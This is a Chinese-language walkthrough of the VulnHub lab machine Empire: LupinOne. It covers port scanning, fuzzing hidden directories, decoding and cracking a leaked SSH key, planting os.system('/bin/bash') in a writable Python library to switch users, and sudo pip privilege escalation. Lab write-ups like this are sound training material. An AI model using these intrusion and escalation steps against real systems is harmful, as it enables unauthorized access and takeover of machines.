---

title: Vulnhub--Empire:LUPINONE
categories: [渗透靶场, Vulnhub]

---

## 渗透复现

1. 尝试爆破和弱口令登录ssh未果
2. 敏感目录泄露，FUZZ爆破出密钥
3. jhon转化密钥，破解密钥
4. 利用密钥进行ssh登录靶机
5. 查看用户可执行权限的文件
6. 水平越权（通过脚本拿到其他用户的shell）
7. sudo的pip命令提权

## 知识扩展

1. 目录扫描
2. Fuzz爆破
3. john工具转化ssh密钥
4. 水平越权
5. Sudo-pip提权

## 靶机地址

[Empire: LupinOne ~ VulnHub](https://www.vulnhub.com/entry/empire-lupinone,750/)

## 主机发现

（1）攻击机

```py
192.168.186.135
```

（2）目标主机

```py
 192.168.186.157
```

## 信息收集

### 端口扫描

（1）扫描服务程序版本，操作系统

```python
nmap -sV -p- -O 192.168.186.157
```

![image-20240828164844648](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281648746.png)

（2）强力扫描（能进行目录扫描）

```py
nmap -A -sV -T4 -p- 192.168.186.157
```

![image-20240828164852615](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281648729.png)

### 端口访问

（1）访问80端口

![image-20240828164902402](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281649468.png)

（2）查看源码（无信息泄露）

![image-20240828164912640](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281649696.png)

### 目录扫描

![image-20240828164919008](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281649078.png)

### 目录爆破

```py
#-c 颜色输出，-w指定字典，-u指定暴力破解的目录，~FUZZ就是爆破类似~myfiles形式的目录
ffuf -c -w /usr/share/wordlists/dirb/common.txt -u 'http://192.168.186.157/~FUZZ'
```

![image-20240828164958276](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281649397.png)

### 目录访问

（1）访问robots

![image-20240828164929599](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281649658.png)

（2）访问~myfile

![image-20240828164937848](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281649896.png)

（3）源码查看（应该还有类似~myfiles的目录）

![image-20240828164945508](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281649567.png)

（4）访问~secret目录

```py
#4个关键点，存在ssh私钥，私钥藏起来了，使用fasttrack字典破解，用户名icex64
#下一步则寻找该私钥，并且用fasttrack字典来破解它
```

![image-20240828165007789](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281650847.png)

（5）猜测ssh私钥以.xxx的形式存在（参数-e指定后缀名列表，-fc过滤指定403状态返回码）

```py
ffuf -c -w /usr/share/wordlists/dirb/common.txt -u 'http://192.168.186.157/~secret/.FUZZ' -e .txt,.html -fc 403
```

![image-20240828165019506](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281650620.png)

（6）扫描无果，更换字典

```py
ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u 'http://192.168.186.157/~secret/.FUZZ' -e .txt,.html -fc 403
```

![image-20240828165033115](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281650238.png)

（7）访问.mysecret.txt

![image-20240828165044273](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281650332.png)

（8）在线编码识别（base58编码）:https://www.dcode.fr/cipher-identifier

![image-20240828165054819](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281650913.png)

（9）base58解码得到ssh私钥

![image-20240828165105509](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281651570.png)

## 实施攻击

（1）将ssh密钥的内容保存为ssh.txt，利用ssh2john转化密钥（经过ssh2john转化之后密钥是可以被破解的）

```py
#在kali中找到ssh2john的路径（ssh2john：转化ssh密钥为john能识别的hash格式）
locate ssh2john
```

![image-20240828165113519](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281651581.png)

（2）将ssh.txt转化为passwd.txt（john可识别的hash格式）

```py
/usr/share/john/ssh2john.py ssh.txt > passwd.txt
```

![image-20240828165122083](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281651142.png)

（3）根据前面的提示，使用fasttrack字典解密ssh，得到密码：P@55w0rd!

```py
john --wordlist=/usr/share/wordlists/fasttrack.txt passwd.txt
John --show passwd.txt
```

![image-20240828165129864](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281651948.png)

（4）给密钥ssh.txt权限，并以此进行ssh远程登录，拿到用户icex64的shell

![image-20240828165139253](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281651350.png)

（5）登录时候如果出现报错（error in libcrypto）

错误原因：base58解密过后的编码先复制到了windows笔记本粘贴后再复制文件到kali，导致报错
解决办法：将解码的密钥直接以vim的形式复制保存到kali中

![image-20240828165149932](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281651008.png)

## 提权

（1）查看用户icex64可执行的文件，查看文件（文件导入了webbrowser模块）

```py
sudo -l
```

![image-20240828165202658](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281652725.png)

![image-20240828165213272](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281652353.png)

（2）查找webbrowser模块（python模块）

```py
whereis webbrowser.py
locate webbrowser.py

#这里也可以用find命令查找
find /usr -name webbrowser
```

![image-20240828165239128](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281652194.png)

![image-20240828165251604](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281652699.png)

（3）查看该文件，发现导入了os模块，如果该文件具有可写权，就可以利用os.system（'/bin/bash'）调用shell

![image-20240828165320993](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281653145.png)

（4）查看文件的权限（当前用户具备可写权）

```py
ls -l /usr/lib/python3.9/webbrowser.py
```

![image-20240828165350909](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281653996.png)

（5）改写文件（vim+文件，发现靶机没有vim命令）

```py
vim /usr/lib/python3.9/webbrowser.py
```

![image-20240828165404922](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281654004.png)

（6）使用nano改写，写入os.system("/bin/bash")

```py
nano /usr/lib/python3.9/webbrowser.py
```

![image-20240828165425039](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281654165.png)

![image-20240828165439727](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281654854.png)

（7）sudo -u命令可以切换到指定用户下执行命令，成功越权至用户arsene

```py
sudo -u arsene python3.9 /home/arsene/heist.py
```

![image-20240828165504953](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281655020.png) 

（8）查看arsene用户的权限（发现arsene用户无需root密码就能执行pip命令）

```py
sudo -l
```

![image-20240828165536251](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281655325.png)

（9）搜寻pip提权方法：https://gtfobins.github.io/gtfobins/pip/

![image-20240828165557815](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281655869.png)

（10）使用sudo提权，复制代码，在终端执行，提权成功

![image-20240828165606060](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281656184.png)